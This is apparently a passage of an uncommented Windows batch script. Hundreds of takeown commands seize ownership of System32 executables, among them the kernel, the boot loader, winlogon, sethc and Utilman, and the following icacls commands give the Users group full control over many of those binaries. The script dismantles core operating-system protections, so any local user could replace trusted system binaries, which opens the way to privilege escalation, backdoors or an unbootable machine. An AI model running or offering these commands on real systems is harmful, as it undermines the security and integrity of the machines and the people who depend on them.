takeown /f C:\Windows\System32\net1.exe /r /d y
takeown /f C:\Windows\System32\netbtugc.exe /r /d y
takeown /f C:\Windows\System32\netcfg.exe /r /d y
takeown /f C:\Windows\System32\NetCfgNotifyObjectHost.exe /r /d y
takeown /f C:\Windows\System32\NetEvtFwdr.exe /r /d y
takeown /f C:\Windows\System32\NetHost.exe /r /d y
takeown /f C:\Windows\System32\netiougc.exe /r /d y
takeown /f C:\Windows\System32\Netplwiz.exe /r /d y
takeown /f C:\Windows\System32\netsh.exe /r /d y
takeown /f C:\Windows\System32\NETSTAT.EXE /r /d y
takeown /f C:\Windows\System32\newdev.exe /r /d y
takeown /f C:\Windows\System32\NgcIso.exe /r /d y
takeown /f C:\Windows\System32\nltest.exe /r /d y
takeown /f C:\Windows\System32\notepad.exe /r /d y
takeown /f C:\Windows\System32\nslookup.exe /r /d y
takeown /f C:\Windows\System32\ntoskrnl.exe /r /d y
takeown /f C:\Windows\System32\ntprint.exe /r /d y
takeown /f C:\Windows\System32\odbcad32.exe /r /d y
takeown /f C:\Windows\System32\odbcconf.exe /r /d y
takeown /f C:\Windows\System32\ofdeploy.exe /r /d y
takeown /f C:\Windows\System32\omadmclient.exe /r /d y
takeown /f C:\Windows\System32\omadmprc.exe /r /d y
takeown /f C:\Windows\System32\OOBE-Maintenance.exe /r /d y
takeown /f C:\Windows\System32\openfiles.exe /r /d y
takeown /f C:\Windows\System32\OpenWith.exe /r /d y
takeown /f C:\Windows\System32\OptionalFeatures.exe /r /d y
takeown /f C:\Windows\System32\osk.exe /r /d y
takeown /f C:\Windows\System32\pacjsworker.exe /r /d y
takeown /f C:\Windows\System32\PackagedCWALauncher.exe /r /d y
takeown /f C:\Windows\System32\PackageInspector.exe /r /d y
takeown /f C:\Windows\System32\PasswordOnWakeSettingFlyout.exe /r /d y
takeown /f C:\Windows\System32\PATHPING.EXE /r /d y
takeown /f C:\Windows\System32\pcalua.exe /r /d y
takeown /f C:\Windows\System32\pcaui.exe /r /d y
takeown /f C:\Windows\System32\pcwrun.exe /r /d y
takeown /f C:\Windows\System32\perfmon.exe /r /d y
takeown /f C:\Windows\System32\phoneactivate.exe /r /d y
takeown /f C:\Windows\System32\PickerHost.exe /r /d y
takeown /f C:\Windows\System32\PinEnrollmentBroker.exe /r /d y
takeown /f C:\Windows\System32\PING.EXE /r /d y
takeown /f C:\Windows\System32\PkgMgr.exe /r /d y
takeown /f C:\Windows\System32\PktMon.exe /r /d y
takeown /f C:\Windows\System32\plasrv.exe /r /d y
takeown /f C:\Windows\System32\PnPUnattend.exe /r /d y
takeown /f C:\Windows\System32\pnputil.exe /r /d y
takeown /f C:\Windows\System32\poqexec.exe /r /d y
takeown /f C:\Windows\System32\pospaymentsworker.exe /r /d y
takeown /f C:\Windows\System32\powercfg.exe /r /d y
takeown /f C:\Windows\System32\PresentationHost.exe /r /d y
takeown /f C:\Windows\System32\PresentationSettings.exe /r /d y
takeown /f C:\Windows\System32\prevhost.exe /r /d y
takeown /f C:\Windows\System32\print.exe /r /d y
takeown /f C:\Windows\System32\PrintBrmUi.exe /r /d y
takeown /f C:\Windows\System32\printfilterpipelinesvc.exe /r /d y
takeown /f C:\Windows\System32\PrintIsolationHost.exe /r /d y
takeown /f C:\Windows\System32\printui.exe /r /d y
takeown /f C:\Windows\System32\proquota.exe /r /d y
takeown /f C:\Windows\System32\provlaunch.exe /r /d y
takeown /f C:\Windows\System32\provtool.exe /r /d y
takeown /f C:\Windows\System32\ProximityUxHost.exe /r /d y
takeown /f C:\Windows\System32\prproc.exe /r /d y
takeown /f C:\Windows\System32\psr.exe /r /d y
takeown /f C:\Windows\System32\pwlauncher.exe /r /d y
takeown /f C:\Windows\System32\qappsrv.exe /r /d y
takeown /f C:\Windows\System32\qprocess.exe /r /d y
takeown /f C:\Windows\System32\query.exe /r /d y
takeown /f C:\Windows\System32\quickassist.exe /r /d y
takeown /f C:\Windows\System32\quser.exe /r /d y
takeown /f C:\Windows\System32\qwinsta.exe /r /d y
takeown /f C:\Windows\System32\rasautou.exe /r /d y
takeown /f C:\Windows\System32\rasdial.exe /r /d y
takeown /f C:\Windows\System32\raserver.exe /r /d y
takeown /f C:\Windows\System32\rasphone.exe /r /d y
takeown /f C:\Windows\System32\rdpclip.exe /r /d y
takeown /f C:\Windows\System32\rdpinit.exe /r /d y
takeown /f C:\Windows\System32\rdpinput.exe /r /d y
takeown /f C:\Windows\System32\RdpSa.exe /r /d y
takeown /f C:\Windows\System32\RdpSaProxy.exe /r /d y
takeown /f C:\Windows\System32\RdpSaUacHelper.exe /r /d y
takeown /f C:\Windows\System32\rdpshell.exe /r /d y
takeown /f C:\Windows\System32\rdpsign.exe /r /d y
takeown /f C:\Windows\System32\rdrleakdiag.exe /r /d y
takeown /f C:\Windows\System32\ReAgentc.exe /r /d y
takeown /f C:\Windows\System32\recdisc.exe /r /d y
takeown /f C:\Windows\System32\recover.exe /r /d y
takeown /f C:\Windows\System32\RecoveryDrive.exe /r /d y
takeown /f C:\Windows\System32\refsutil.exe /r /d y
takeown /f C:\Windows\System32\reg.exe /r /d y
takeown /f C:\Windows\System32\regedt32.exe /r /d y
takeown /f C:\Windows\System32\regini.exe /r /d y
takeown /f C:\Windows\System32\Register-CimProvider.exe /r /d y
takeown /f C:\Windows\System32\regsvr32.exe /r /d y
takeown /f C:\Windows\System32\rekeywiz.exe /r /d y
takeown /f C:\Windows\System32\relog.exe /r /d y
takeown /f C:\Windows\System32\RelPost.exe /r /d y
takeown /f C:\Windows\System32\RemoteAppLifetimeManager.exe /r /d y
takeown /f C:\Windows\System32\RemotePosWorker.exe /r /d y
takeown /f C:\Windows\System32\repair-bde.exe /r /d y
takeown /f C:\Windows\System32\replace.exe /r /d y
takeown /f C:\Windows\System32\reset.exe /r /d y
takeown /f C:\Windows\System32\ResetEngine.exe /r /d y
takeown /f C:\Windows\System32\resmon.exe /r /d y
takeown /f C:\Windows\System32\RMActivate.exe /r /d y
takeown /f C:\Windows\System32\RMActivate_isv.exe /r /d y
takeown /f C:\Windows\System32\RMActivate_ssp.exe /r /d y
takeown /f C:\Windows\System32\RMActivate_ssp_isv.exe /r /d y
takeown /f C:\Windows\System32\RmClient.exe /r /d y
takeown /f C:\Windows\System32\rmttpmvscmgrsvr.exe /r /d y
takeown /f C:\Windows\System32\Robocopy.exe /r /d y
takeown /f C:\Windows\System32\ROUTE.EXE /r /d y
takeown /f C:\Windows\System32\RpcPing.exe /r /d y
takeown /f C:\Windows\System32\rrinstaller.exe /r /d y
takeown /f C:\Windows\System32\rstrui.exe /r /d y
takeown /f C:\Windows\System32\runas.exe /r /d y
takeown /f C:\Windows\System32\rundll32.exe /r /d y
takeown /f C:\Windows\System32\runexehelper.exe /r /d y
takeown /f C:\Windows\System32\RunLegacyCPLElevated.exe /r /d y
takeown /f C:\Windows\System32\runonce.exe /r /d y
takeown /f C:\Windows\System32\RuntimeBroker.exe /r /d y
takeown /f C:\Windows\System32\rwinsta.exe /r /d y
takeown /f C:\Windows\System32\sc.exe /r /d y
takeown /f C:\Windows\System32\schtasks.exe /r /d y
takeown /f C:\Windows\System32\ScriptRunner.exe /r /d y
takeown /f C:\Windows\System32\sdbinst.exe /r /d y
takeown /f C:\Windows\System32\sdchange.exe /r /d y
takeown /f C:\Windows\System32\sdclt.exe /r /d y
takeown /f C:\Windows\System32\sdiagnhost.exe /r /d y
takeown /f C:\Windows\System32\SearchFilterHost.exe /r /d y
takeown /f C:\Windows\System32\SearchIndexer.exe /r /d y
takeown /f C:\Windows\System32\SearchProtocolHost.exe /r /d y
takeown /f C:\Windows\System32\SecEdit.exe /r /d y
takeown /f C:\Windows\System32\secinit.exe /r /d y
takeown /f C:\Windows\System32\SecureBootEncodeUEFI.exe /r /d y
takeown /f C:\Windows\System32\securekernel.exe /r /d y
takeown /f C:\Windows\System32\SecurityHealthHost.exe /r /d y
takeown /f C:\Windows\System32\SecurityHealthService.exe /r /d y
takeown /f C:\Windows\System32\SecurityHealthSystray.exe /r /d y
takeown /f C:\Windows\System32\SensorDataService.exe /r /d y
takeown /f C:\Windows\System32\services.exe /r /d y
takeown /f C:\Windows\System32\sessionmsg.exe /r /d y
takeown /f C:\Windows\System32\sethc.exe /r /d y
takeown /f C:\Windows\System32\setspn.exe /r /d y
takeown /f C:\Windows\System32\SettingSyncHost.exe /r /d y
takeown /f C:\Windows\System32\setupcl.exe /r /d y
takeown /f C:\Windows\System32\setupugc.exe /r /d y
takeown /f C:\Windows\System32\setx.exe /r /d y
takeown /f C:\Windows\System32\sfc.exe /r /d y
takeown /f C:\Windows\System32\SgrmBroker.exe /r /d y
takeown /f C:\Windows\System32\SgrmLpac.exe /r /d y
takeown /f C:\Windows\System32\ShellAppRuntime.exe /r /d y
takeown /f C:\Windows\System32\shrpubw.exe /r /d y
takeown /f C:\Windows\System32\shutdown.exe /r /d y
takeown /f C:\Windows\System32\sigverif.exe /r /d y
takeown /f C:\Windows\System32\SIHClient.exe /r /d y
takeown /f C:\Windows\System32\sihost.exe /r /d y
takeown /f C:\Windows\System32\SlideToShutDown.exe /r /d y
takeown /f C:\Windows\System32\slui.exe /r /d y
takeown /f C:\Windows\System32\smartscreen.exe /r /d y
takeown /f C:\Windows\System32\smss.exe /r /d y
takeown /f C:\Windows\System32\SndVol.exe /r /d y
takeown /f C:\Windows\System32\SnippingTool.exe /r /d y
takeown /f C:\Windows\System32\snmptrap.exe /r /d y
takeown /f C:\Windows\System32\sort.exe /r /d y
takeown /f C:\Windows\System32\SpaceAgent.exe /r /d y
takeown /f C:\Windows\System32\spaceman.exe /r /d y
takeown /f C:\Windows\System32\SpatialAudioLicenseSrv.exe /r /d y
takeown /f C:\Windows\System32\Spectrum.exe /r /d y
takeown /f C:\Windows\System32\spoolsv.exe /r /d y
takeown /f C:\Windows\System32\SppExtComObj.Exe /r /d y
takeown /f C:\Windows\System32\sppsvc.exe /r /d y
takeown /f C:\Windows\System32\srdelayed.exe /r /d y
takeown /f C:\Windows\System32\SrTasks.exe /r /d y
takeown /f C:\Windows\System32\stordiag.exe /r /d y
takeown /f C:\Windows\System32\subst.exe /r /d y
takeown /f C:\Windows\System32\svchost.exe /r /d y
takeown /f C:\Windows\System32\sxstrace.exe /r /d y
takeown /f C:\Windows\System32\SyncAppvPublishingServer.exe /r /d y
takeown /f C:\Windows\System32\SyncHost.exe /r /d y
takeown /f C:\Windows\System32\SysResetErr.exe /r /d y
takeown /f C:\Windows\System32\systeminfo.exe /r /d y
takeown /f C:\Windows\System32\SystemPropertiesAdvanced.exe /r /d y
takeown /f C:\Windows\System32\SystemPropertiesComputerName.exe /r /d y
takeown /f C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe /r /d y
takeown /f C:\Windows\System32\SystemPropertiesHardware.exe /r /d y
takeown /f C:\Windows\System32\SystemPropertiesPerformance.exe /r /d y
takeown /f C:\Windows\System32\SystemPropertiesProtection.exe /r /d y
takeown /f C:\Windows\System32\SystemPropertiesRemote.exe /r /d y
takeown /f C:\Windows\System32\systemreset.exe /r /d y
takeown /f C:\Windows\System32\SystemSettingsAdminFlows.exe /r /d y
takeown /f C:\Windows\System32\SystemSettingsBroker.exe /r /d y
takeown /f C:\Windows\System32\SystemSettingsRemoveDevice.exe /r /d y
takeown /f C:\Windows\System32\SystemUWPLauncher.exe /r /d y
takeown /f C:\Windows\System32\systray.exe /r /d y
takeown /f C:\Windows\System32\tabcal.exe /r /d y
takeown /f C:\Windows\System32\takeown.exe /r /d y
takeown /f C:\Windows\System32\TapiUnattend.exe /r /d y
takeown /f C:\Windows\System32\tar.exe /r /d y
takeown /f C:\Windows\System32\taskhostw.exe /r /d y
takeown /f C:\Windows\System32\taskkill.exe /r /d y
takeown /f C:\Windows\System32\tasklist.exe /r /d y
takeown /f C:\Windows\System32\Taskmgr.exe /r /d y
takeown /f C:\Windows\System32\tcblaunch.exe /r /d y
takeown /f C:\Windows\System32\tcmsetup.exe /r /d y
takeown /f C:\Windows\System32\TCPSVCS.EXE /r /d y
takeown /f C:\Windows\System32\ThumbnailExtractionHost.exe /r /d y
takeown /f C:\Windows\System32\TieringEngineService.exe /r /d y
takeown /f C:\Windows\System32\timeout.exe /r /d y
takeown /f C:\Windows\System32\TokenBrokerCookies.exe /r /d y
takeown /f C:\Windows\System32\TpmInit.exe /r /d y
takeown /f C:\Windows\System32\TpmTool.exe /r /d y
takeown /f C:\Windows\System32\tpmvscmgr.exe /r /d y
takeown /f C:\Windows\System32\tpmvscmgrsvr.exe /r /d y
takeown /f C:\Windows\System32\tracerpt.exe /r /d y
takeown /f C:\Windows\System32\TRACERT.EXE /r /d y
takeown /f C:\Windows\System32\tscon.exe /r /d y
takeown /f C:\Windows\System32\tsdiscon.exe /r /d y
takeown /f C:\Windows\System32\tskill.exe /r /d y
takeown /f C:\Windows\System32\TSTheme.exe /r /d y
takeown /f C:\Windows\System32\TSWbPrxy.exe /r /d y
takeown /f C:\Windows\System32\ttdinject.exe /r /d y
takeown /f C:\Windows\System32\tttracer.exe /r /d y
takeown /f C:\Windows\System32\typeperf.exe /r /d y
takeown /f C:\Windows\System32\tzsync.exe /r /d y
takeown /f C:\Windows\System32\tzutil.exe /r /d y
takeown /f C:\Windows\System32\UCPDMgr.exe /r /d y
takeown /f C:\Windows\System32\ucsvc.exe /r /d y
takeown /f C:\Windows\System32\UevAgentPolicyGenerator.exe /r /d y
takeown /f C:\Windows\System32\UevAppMonitor.exe /r /d y
takeown /f C:\Windows\System32\UevTemplateBaselineGenerator.exe /r /d y
takeown /f C:\Windows\System32\UevTemplateConfigItemGenerator.exe /r /d y
takeown /f C:\Windows\System32\UIMgrBroker.exe /r /d y
takeown /f C:\Windows\System32\unlodctr.exe /r /d y
takeown /f C:\Windows\System32\unregmp2.exe /r /d y
takeown /f C:\Windows\System32\upfc.exe /r /d y
takeown /f C:\Windows\System32\UpgradeResultsUI.exe /r /d y
takeown /f C:\Windows\System32\upnpcont.exe /r /d y
takeown /f C:\Windows\System32\UPPrinterInstaller.exe /r /d y
takeown /f C:\Windows\System32\UserAccountBroker.exe /r /d y
takeown /f C:\Windows\System32\UserAccountControlSettings.exe /r /d y
takeown /f C:\Windows\System32\userinit.exe /r /d y
takeown /f C:\Windows\System32\UsoClient.exe /r /d y
takeown /f C:\Windows\System32\usocoreworker.exe /r /d y
takeown /f C:\Windows\System32\UtcDecoderHost.exe /r /d y
takeown /f C:\Windows\System32\Utilman.exe /r /d y
takeown /f C:\Windows\System32\VaultCmd.exe /r /d y
takeown /f C:\Windows\System32\vds.exe /r /d y
takeown /f C:\Windows\System32\vdsldr.exe /r /d y
takeown /f C:\Windows\System32\verclsid.exe /r /d y
takeown /f C:\Windows\System32\verifier.exe /r /d y
takeown /f C:\Windows\System32\verifiergui.exe /r /d y
takeown /f C:\Windows\System32\vssadmin.exe /r /d y
takeown /f C:\Windows\System32\VSSVC.exe /r /d y
takeown /f C:\Windows\System32\w32tm.exe /r /d y
takeown /f C:\Windows\System32\WaaSMedicAgent.exe /r /d y
takeown /f C:\Windows\System32\waitfor.exe /r /d y
takeown /f C:\Windows\System32\WallpaperHost.exe /r /d y
takeown /f C:\Windows\System32\wbadmin.exe /r /d y
takeown /f C:\Windows\System32\wbengine.exe /r /d y
takeown /f C:\Windows\System32\wecutil.exe /r /d y
takeown /f C:\Windows\System32\WerFault.exe /r /d y
takeown /f C:\Windows\System32\WerFaultSecure.exe /r /d y
takeown /f C:\Windows\System32\wermgr.exe /r /d y
takeown /f C:\Windows\System32\wevtutil.exe /r /d y
takeown /f C:\Windows\System32\wextract.exe /r /d y
takeown /f C:\Windows\System32\WFS.exe /r /d y
takeown /f C:\Windows\System32\where.exe /r /d y
takeown /f C:\Windows\System32\whoami.exe /r /d y
takeown /f C:\Windows\System32\wiaacmgr.exe /r /d y
takeown /f C:\Windows\System32\wiawow64.exe /r /d y
takeown /f C:\Windows\System32\wifitask.exe /r /d y
takeown /f C:\Windows\System32\wimserv.exe /r /d y
takeown /f C:\Windows\System32\WinBioDataModelOOBE.exe /r /d y
takeown /f C:\Windows\System32\Windows.Media.BackgroundPlayback.exe /r /d y
takeown /f C:\Windows\System32\Windows.WARP.JITService.exe /r /d y
takeown /f C:\Windows\System32\WindowsActionDialog.exe /r /d y
takeown /f C:\Windows\System32\WindowsUpdateElevatedInstaller.exe /r /d y
takeown /f C:\Windows\System32\wininit.exe /r /d y
takeown /f C:\Windows\System32\winload.exe /r /d y
takeown /f C:\Windows\System32\winlogon.exe /r /d y
takeown /f C:\Windows\System32\winresume.exe /r /d y
takeown /f C:\Windows\System32\winrs.exe /r /d y
takeown /f C:\Windows\System32\winrshost.exe /r /d y
takeown /f C:\Windows\System32\WinRTNetMUAHostServer.exe /r /d y
takeown /f C:\Windows\System32\WinSAT.exe /r /d y
takeown /f C:\Windows\System32\winver.exe /r /d y
takeown /f C:\Windows\System32\wkspbroker.exe /r /d y
takeown /f C:\Windows\System32\wksprt.exe /r /d y
takeown /f C:\Windows\System32\wlanext.exe /r /d y
takeown /f C:\Windows\System32\wlrmdr.exe /r /d y
takeown /f C:\Windows\System32\WMPDMC.exe /r /d y
takeown /f C:\Windows\System32\WorkFolders.exe /r /d y
takeown /f C:\Windows\System32\wowreg32.exe /r /d y
takeown /f C:\Windows\System32\WpcMon.exe /r /d y
takeown /f C:\Windows\System32\WpcTok.exe /r /d y
takeown /f C:\Windows\System32\WPDShextAutoplay.exe /r /d y
takeown /f C:\Windows\System32\wpnpinst.exe /r /d y
takeown /f C:\Windows\System32\wpr.exe /r /d y
takeown /f C:\Windows\System32\write.exe /r /d y
takeown /f C:\Windows\System32\wscadminui.exe /r /d y
takeown /f C:\Windows\System32\WSCollect.exe /r /d y
takeown /f C:\Windows\System32\wscript.exe /r /d y
takeown /f C:\Windows\System32\wsl.exe /r /d y
takeown /f C:\Windows\System32\WSManHTTPConfig.exe /r /d y
takeown /f C:\Windows\System32\wsmprovhost.exe /r /d y
takeown /f C:\Windows\System32\wsqmcons.exe /r /d y
takeown /f C:\Windows\System32\WSReset.exe /r /d y
takeown /f C:\Windows\System32\wuapihost.exe /r /d y
takeown /f C:\Windows\System32\wuauclt.exe /r /d y
takeown /f C:\Windows\System32\WUDFCompanionHost.exe /r /d y
takeown /f C:\Windows\System32\WUDFHost.exe /r /d y
takeown /f C:\Windows\System32\wusa.exe /r /d y
takeown /f C:\Windows\System32\WWAHost.exe /r /d y
takeown /f C:\Windows\System32\XblGameSaveTask.exe /r /d y
takeown /f C:\Windows\System32\xcopy.exe /r /d y
takeown /f C:\Windows\System32\xwizard.exe /r /d y
takeown /f C:\Windows\System32\AppV\AppVStreamingUX.exe /r /d y
takeown /f C:\Windows\System32\Boot\winload.exe /r /d y
takeown /f C:\Windows\System32\Boot\winresume.exe /r /d y
takeown /f C:\Windows\System32\Com\comrepl.exe /r /d y
takeown /f C:\Windows\System32\Com\MigRegDB.exe /r /d y
takeown /f C:\Windows\System32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe /r /d y
takeown /f C:\Windows\System32\Dism\DismHost.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\CustomModeApp.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\CustomModeAppv2_0.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\difx64.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\DPTopologyApp.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\DPTopologyAppv2_0.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\GfxUIEx.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\Gfxv2_0.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\Gfxv4_0.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxCUIService.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxEM.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxext.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxHK.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxTray.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelCpHeciSvc.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelWiDiUMS64.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelWiDiVAD64.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\dpinst.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\InstNT.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynMood.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynReflash.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPEnh.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPEnhService.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPHelper.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynZMetr.exe /r /d y
takeown /f C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\Tutorial.exe /r /d y
takeown /f C:\Windows\System32\F12\IEChooser.exe /r /d y
takeown /f C:\Windows\System32\IME\IMEJP\IMJPDCT.EXE /r /d y
takeown /f C:\Windows\System32\IME\IMEJP\IMJPSET.EXE /r /d y
takeown /f C:\Windows\System32\IME\IMEJP\IMJPUEX.EXE /r /d y
takeown /f C:\Windows\System32\IME\IMEJP\imjpuexc.exe /r /d y
takeown /f C:\Windows\System32\IME\IMETC\IMTCLNWZ.EXE /r /d y
takeown /f C:\Windows\System32\IME\IMETC\IMTCPROP.exe /r /d y
takeown /f C:\Windows\System32\IME\SHARED\IMCCPHR.exe /r /d y
takeown /f C:\Windows\System32\IME\SHARED\ImeBroker.exe /r /d y
takeown /f C:\Windows\System32\IME\SHARED\imecfmui.exe /r /d y
takeown /f C:\Windows\System32\IME\SHARED\IMEPADSV.EXE /r /d y
takeown /f C:\Windows\System32\IME\SHARED\IMESEARCH.EXE /r /d y
takeown /f C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE /r /d y
takeown /f C:\Windows\System32\InputMethod\CHS\ChsIME.exe /r /d y
takeown /f C:\Windows\System32\InputMethod\CHT\ChtIME.exe /r /d y
takeown /f C:\Windows\System32\migwiz\mighost.exe /r /d y
takeown /f C:\Windows\System32\oobe\audit.exe /r /d y
takeown /f C:\Windows\System32\oobe\AuditShD.exe /r /d y
takeown /f C:\Windows\System32\oobe\FirstLogonAnim.exe /r /d y
takeown /f C:\Windows\System32\oobe\msoobe.exe /r /d y
takeown /f C:\Windows\System32\oobe\oobeldr.exe /r /d y
takeown /f C:\Windows\System32\oobe\Setup.exe /r /d y
takeown /f C:\Windows\System32\oobe\UserOOBEBroker.exe /r /d y
takeown /f C:\Windows\System32\oobe\windeploy.exe /r /d y
takeown /f C:\Windows\System32\OpenSSH\scp.exe /r /d y
takeown /f C:\Windows\System32\OpenSSH\sftp.exe /r /d y
takeown /f C:\Windows\System32\OpenSSH\ssh-add.exe /r /d y
takeown /f C:\Windows\System32\OpenSSH\ssh-agent.exe /r /d y
takeown /f C:\Windows\System32\OpenSSH\ssh-keygen.exe /r /d y
takeown /f C:\Windows\System32\OpenSSH\ssh-keyscan.exe /r /d y
takeown /f C:\Windows\System32\OpenSSH\ssh.exe /r /d y
takeown /f C:\Windows\System32\PerceptionSimulation\PerceptionSimulationInput.exe /r /d y
takeown /f C:\Windows\System32\PerceptionSimulation\PerceptionSimulationService.exe /r /d y
takeown /f C:\Windows\System32\Speech\SpeechUX\SpeechUXWiz.exe /r /d y
takeown /f C:\Windows\System32\Speech_OneCore\common\SpeechModelDownload.exe /r /d y
takeown /f C:\Windows\System32\Speech_OneCore\common\SpeechRuntime.exe /r /d y
takeown /f C:\Windows\System32\spool\tools\PrintBrm.exe /r /d y
takeown /f C:\Windows\System32\spool\tools\PrintBrmEngine.exe /r /d y
takeown /f C:\Windows\System32\Sysprep\sysprep.exe /r /d y
takeown /f C:\Windows\System32\SystemResetPlatform\SystemResetPlatform.exe /r /d y
takeown /f C:\Windows\System32\UNP\UNPUXHost.exe /r /d y
takeown /f C:\Windows\System32\UNP\UNPUXLauncher.exe /r /d y
takeown /f C:\Windows\System32\UNP\UpdateNotificationMgr.exe /r /d y
takeown /f C:\Windows\System32\wbem\mofcomp.exe /r /d y
takeown /f C:\Windows\System32\wbem\scrcons.exe /r /d y
takeown /f C:\Windows\System32\wbem\unsecapp.exe /r /d y
takeown /f C:\Windows\System32\wbem\wbemtest.exe /r /d y
takeown /f C:\Windows\System32\wbem\WinMgmt.exe /r /d y
takeown /f C:\Windows\System32\wbem\WMIADAP.exe /r /d y
takeown /f C:\Windows\System32\wbem\WmiApSrv.exe /r /d y
takeown /f C:\Windows\System32\wbem\WMIC.exe /r /d y
takeown /f C:\Windows\System32\wbem\WmiPrvSE.exe /r /d y
takeown /f C:\Windows\System32\WinBioPlugIns\FaceFodUninstaller.exe /r /d y
takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /r /d y
takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe /r /d y
icacls C:\Windows\System32\AppV\AppVStreamingUX.exe /t /Grant Users:F
icacls C:\Windows\System32\Boot\winload.exe /t /Grant Users:F
icacls C:\Windows\System32\Boot\winresume.exe /t /Grant Users:F
icacls C:\Windows\System32\Com\comrepl.exe /t /Grant Users:F
icacls C:\Windows\System32\Com\MigRegDB.exe /t /Grant Users:F
icacls C:\Windows\System32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe /t /Grant Users:F
icacls C:\Windows\System32\Dism\DismHost.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\CustomModeApp.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\CustomModeAppv2_0.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\difx64.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\DPTopologyApp.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\DPTopologyAppv2_0.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\GfxUIEx.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\Gfxv2_0.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\Gfxv4_0.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxCUIService.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxEM.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxext.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxHK.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\igfxTray.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelCpHeciSvc.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelWiDiUMS64.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_5f8dc4eab6fcd2f0\IntelWiDiVAD64.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\dpinst.exe /t /Grant Users:F
